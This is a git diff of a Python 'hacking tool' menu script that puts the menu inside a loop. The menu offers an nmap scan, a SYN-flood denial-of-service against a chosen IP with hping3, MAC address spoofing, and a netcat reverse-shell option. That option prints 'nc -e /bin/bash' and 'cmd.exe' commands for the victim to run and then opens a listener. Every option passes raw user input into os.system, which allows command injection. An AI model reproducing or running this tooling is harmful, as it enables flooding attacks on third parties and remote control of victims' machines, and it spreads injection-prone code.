@@ -45,8 +45,8 @@ if feline_surprise != 4:
         """)
         print("Yuka says: 'I am the queen of this tool.'")
         print(Style.RESET_ALL)
-
-option = input("""1.NMAP PORT SCAN
+while True:
+    option = input("""1.NMAP PORT SCAN
          2.PINGER
          3.SYN DOS
          4.MAC SPOOFING
@@ -57,35 +57,35 @@ option = input("""1.NMAP PORT SCAN
          9.EXIT NEVER
          """)
 
-if option == "1":
-    target_ip = input("What is the target's ip ")
-    os.system("sudo nmap " + target_ip)
-elif option == "0":
-    print("You have decided to be the different one")
-    print("We are NEVER we do not forget, we do not forgive")
-elif option == "2":
-    target_ip = input("What is the ip of the system you Wanna ping? ")
-    os.system("ping " + target_ip)
-elif option == "3":
-    target_ip = input("What is the ip of the target? ")
-    os.system("sudo hping3 -S --flood -p 80 " + target_ip)
-elif option == "4":
-    option = input("What type of network interface do you wanna spoof ( for wifi do wlan0 for ethernet do eth0 ")
-    os.system("sudo ifconfig " + option + " down")
-    os.system("sudo macchanger -r " + option)
-    os.system("sudo ifconfig " + option + " up")
-elif option == "5":
-    target_ip = input("What is the target's ip? ")
-    os.system("whois " + target_ip)
-elif option == "6":
-    target_ip = input("What is the domain you want to lookup? ")
-    os.system("nslookup " + target_ip)
-elif option == "7":
-    print("TARGET HAS TO HAVE NETCAT INSTALLED!!")
-    lport = input("What port do you want the target to connect on? (recommended a not in use one)")
-    print("TARGET HAS TO RUN THIS COMMAND: Windows = cmd.exe /c nc.exe <your ip>"  + lport +  "-e cmd.exe linux = nc -e /bin/bash <your ip> " + lport)
-    os.system("nc -lnvp " + lport)
-elif option == "8":
-    os.system("shutdown -h now")
-elif option == "9":
-    exit()
+    if option == "1":
+        target_ip = input("What is the target's ip ")
+        os.system("sudo nmap " + target_ip)
+    elif option == "0":
+        print("You have decided to be the different one")
+        print("We are NEVER we do not forget, we do not forgive")
+    elif option == "2":
+        target_ip = input("What is the ip of the system you Wanna ping? ")
+        os.system("ping " + target_ip)
+    elif option == "3":
+        target_ip = input("What is the ip of the target? ")
+        os.system("sudo hping3 -S --flood -p 80 " + target_ip)
+    elif option == "4":
+        option = input("What type of network interface do you wanna spoof ( for wifi do wlan0 for ethernet do eth0 ")
+        os.system("sudo ifconfig " + option + " down")
+        os.system("sudo macchanger -r " + option)
+        os.system("sudo ifconfig " + option + " up")
+    elif option == "5":
+        target_ip = input("What is the target's ip? ")
+        os.system("whois " + target_ip)
+    elif option == "6":
+        target_ip = input("What is the domain you want to lookup? ")
+        os.system("nslookup " + target_ip)
+    elif option == "7":
+        print("TARGET HAS TO HAVE NETCAT INSTALLED!!")
+        lport = input("What port do you want the target to connect on? (recommended a not in use one)")
+        print("TARGET HAS TO RUN THIS COMMAND: Windows = cmd.exe /c nc.exe <your ip>"  + lport +  "-e cmd.exe linux = nc -e /bin/bash <your ip> " + lport)
+        os.system("nc -lnvp " + lport)
+    elif option == "8":
+        os.system("shutdown -h now")
+    elif option == "9":
+        exit()
